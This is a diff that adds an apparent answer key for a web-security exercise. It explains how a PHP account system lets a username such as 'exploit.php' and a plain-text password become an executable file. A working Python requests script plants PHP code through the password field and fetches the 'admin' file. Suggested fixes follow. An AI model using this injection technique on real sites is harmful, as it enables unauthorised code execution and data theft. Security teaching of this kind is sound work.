@@ -1,0 +1,27 @@
+The solution to this exercise requires the student to exploit a vulnerability in the user account system.
+The user accounts are stored using the username as the directory name.
+This username can include a '.' which allows the student to use a name that ends in '.php'
+Since the password is in plain text, and has no restrictions, the student can put in the php code to run.
+This code should get the file contents of 'admin' and print them out.
+The email can be any valid email (must have a '@' and one '.' after it).
+The student then just needs to go the user file created using the web browser (http://localhost/site/data/users/exploit.php)
+
+
+A possible solution is:
+import requests
+
+SESSION = requests.Session()
+PATH_CREATE = 'http://localhost/site/data/user.php'
+PHP = '<?php $file = file_get_contents(\'admin\', true); print $file ?>'
+USER = {'username': 'exploit.php', 'email': 'test@test.com', 'password': PHP}
+ACCOUNT = SESSION.post(PATH_CREATE, data=USER)
+
+PATH_EXPLOIT = 'http://localhost/site/data/users/exploit.php'
+ADMIN = SESSION.post(PATH_EXPLOIT)
+print(ADMIN.text)
+
+
+Some possible ways to fix exploit:
+    - Put some limit on password feild
+    - Remove the ability for a username to include a '.'
+    - Use email for the user accounts in the file system
